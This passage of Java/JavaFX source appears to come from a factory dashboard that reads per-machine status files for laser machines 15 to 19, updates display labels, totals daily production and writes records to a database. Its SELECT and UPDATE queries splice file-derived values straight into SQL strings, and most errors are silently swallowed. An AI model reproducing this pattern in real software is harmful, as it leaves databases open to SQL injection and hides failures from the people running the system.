              eff114.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff114.setText("N/A");
          }
          }
          
          
        
          
          /////////////////////////////////////////////////////////////////////////////////////////////
             
             
             
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
      
     
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
           
           
           
           
           //buffr.close();
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
            
            lkg15.delete();
        }  
            
            
            workingmachinesno=workingmachinesno+1;
            
        }
    else { 
        /////////////////////// Machine 15 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno114.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno114.setText("Machine   "+machine_number15);
        nog114.setText("0");
        eff114.setText("0%");
        mod114.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
        mod114.setText("Machine isn't working");
        unit114.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit114.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
      
    
     
     try {            Thread.sleep(500);        } catch (InterruptedException ex) {            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);        }
 
     refresh114.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
        
        
//    }
//    }).start(); 
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
    
        
        
    
    refresh115.setStyle("-fx-background-color:green;");
     /////////////////////// Machine 16 ////////////////////////////
      String machine_number16="16";  
//      String poth16 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth16=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
        File lkg16=new File (poth+"\\Machine16.kady");
        if (lkg16.exists()) {
            try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg16));
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno115.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod115.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit115.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mod115.setText(v5);
           unit115.setText(v6);
           
            buffr.close();
            /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
           
            areatoupdate.clear();
            
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine16.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
               
           areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine16.txt"));
                    pnm.println(input);
//                    FileOutputStream File = new FileOutputStream(hn+"\\Machine1.txt");
//                    File.write(input.getBytes());
                    pnm.close();
                    areatoupdate.clear();


                   
               }
               else {
                   
                   //Write or append
                   
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine16.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.CREATE);
                       } 
                       catch (IOException ioe) {
                       }
                   
               }
             
             //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine16.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine16.txt"));
             ndk.println(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe16.txt"));
             summe16=Integer.parseInt(wq.readLine());
             wq.close();
               try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine16.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 
                 else {
                     String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
                 
             
             }
             nog115.setText(Integer.toString(sum-summe16));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          } 

//nog115.setText("N/A");
//nog115.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));
               
               
          //////////////////////////////////Create Performance Here////////////////////////////////////
          long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane16.setStyle("-fx-background-color:orange;");
              eff115.setText("0%");
          }
          
          else {
              
                vboxpane16.setStyle("-fx-background-color:transparent;");
              
              long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff115.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff115.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff115.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff115.setText("N/A");
          }
          }
          
          
        
          
          /////////////////////////////////////////////////////////////////////////////////////////////
             
             
             
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
      
     
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
           
           
           
           
           //buffr.close();
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
            
            lkg16.delete();
        }  
            
            workingmachinesno=workingmachinesno+1;
            
            
        }
    else { 
        /////////////////////// Machine 16 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno115.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno115.setText("Machine   "+machine_number16);
        nog115.setText("0");
        eff115.setText("0%");
        mod115.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
        mod115.setText("Machine isn't working");
        unit115.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit115.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
      
    
     
     try {            Thread.sleep(500);        } catch (InterruptedException ex) {            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);        }
 
     refresh115.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
        
        
//    }
//    }).start(); 
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
       
    
        
    
    refresh116.setStyle("-fx-background-color:green;");
     /////////////////////// Machine 17 ////////////////////////////
      String machine_number17="17";  
//      String poth17 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth17=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
        File lkg17=new File (poth+"\\Machine17.kady");
        if (lkg17.exists()) {
            try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg17));
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno116.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod116.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit116.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mod116.setText(v5);
           unit116.setText(v6);
           
            buffr.close();
            /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
           
            areatoupdate.clear();
            
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine17.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
               
          areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine17.txt"));
                    pnm.println(input);
//                    FileOutputStream File = new FileOutputStream(hn+"\\Machine1.txt");
//                    File.write(input.getBytes());
                    pnm.close();
                    areatoupdate.clear();


                   
               }
               else {
                   
                   //Write or append
                   
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine17.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.CREATE);
                       } 
                       catch (IOException ioe) {
                       }
                   
               }
             
             //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine17.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine17.txt"));
             ndk.println(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe17.txt"));
             summe17=Integer.parseInt(wq.readLine());
             wq.close();
               try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine17.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 
                 else {
                     String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
                 
             
             }
             nog116.setText(Integer.toString(sum-summe17));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          }  
//
//nog116.setText("N/A");
//nog116.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));
               
               
          //////////////////////////////////Create Performance Here////////////////////////////////////
          long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane17.setStyle("-fx-background-color:orange;");
              eff116.setText("0%");
          }
          
          else {
              
                vboxpane17.setStyle("-fx-background-color:transparent;");
              
               
          long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff116.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff116.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff116.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff116.setText("N/A");
          }
          
          }
          
       
          
          /////////////////////////////////////////////////////////////////////////////////////////////
             
             
             
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
      
     
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
           
           
           
           
           //buffr.close();
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
            
            lkg17.delete();
        }  
            
            
            workingmachinesno=workingmachinesno+1;
            
        }
    else { 
        /////////////////////// Machine 17 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno116.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno116.setText("Machine   "+machine_number17);
        nog116.setText("0");
        eff116.setText("0%");
        mod116.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
        mod116.setText("Machine isn't working");
        unit116.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit116.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
      
    
     
     try {            Thread.sleep(500);        } catch (InterruptedException ex) {            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);        }
 
     refresh116.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
    
        
        
//    }
//    }).start(); 
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
    
        
        
    
    refresh117.setStyle("-fx-background-color:green;");
     /////////////////////// Machine 18 ////////////////////////////
      String machine_number18="18";  
//      String poth18 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth18=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
        File lkg18=new File (poth+"\\Machine18.kady");
        if (lkg18.exists()) {
            try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg18));
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno117.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod117.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit117.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mod117.setText(v5);
           unit117.setText(v6);
           
            buffr.close();
            /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
           
            areatoupdate.clear();
            
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine18.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
               
            areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine18.txt"));
                    pnm.println(input);
//                    FileOutputStream File = new FileOutputStream(hn+"\\Machine1.txt");
//                    File.write(input.getBytes());
                    pnm.close();
                    areatoupdate.clear();


                   
               }
               else {
                   
                   //Write or append
                   
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine18.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.CREATE);
                       } 
                       catch (IOException ioe) {
                       }
                   
               }
             
             //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine18.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine18.txt"));
             ndk.println(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe18.txt"));
             summe18=Integer.parseInt(wq.readLine());
             wq.close();
               try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine18.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 
                 else {
                     String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
                 
             
             }
             nog117.setText(Integer.toString(sum-summe18));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          }  

//nog117.setText("N/A");
//nog117.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));
               
               
          //////////////////////////////////Create Performance Here////////////////////////////////////
          long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane18.setStyle("-fx-background-color:orange;");
              eff117.setText("0%");
          }
          
          else {
              
                vboxpane18.setStyle("-fx-background-color:transparent;");
              
              
          long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff117.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff117.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff117.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff117.setText("N/A");
          }
          }
          
        
          
          /////////////////////////////////////////////////////////////////////////////////////////////
             
             
             
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
      
     
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
           
           
           
           
           //buffr.close();
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
            
            lkg18.delete();
        }  
            
            
           workingmachinesno=workingmachinesno+1; 
            
        }
    else { 
        /////////////////////// Machine 18 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno117.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno117.setText("Machine   "+machine_number18);
        nog117.setText("0");
        eff117.setText("0%");
        mod117.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
        mod117.setText("Machine isn't working");
        unit117.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit117.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
      
    
     
     try {            Thread.sleep(500);        } catch (InterruptedException ex) {            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);        }
 
     refresh117.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
        
        
//    }
//    }).start(); 
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
    
        
        
    
    refresh118.setStyle("-fx-background-color:green;");
     /////////////////////// Machine 19 ////////////////////////////
      String machine_number19="19";  
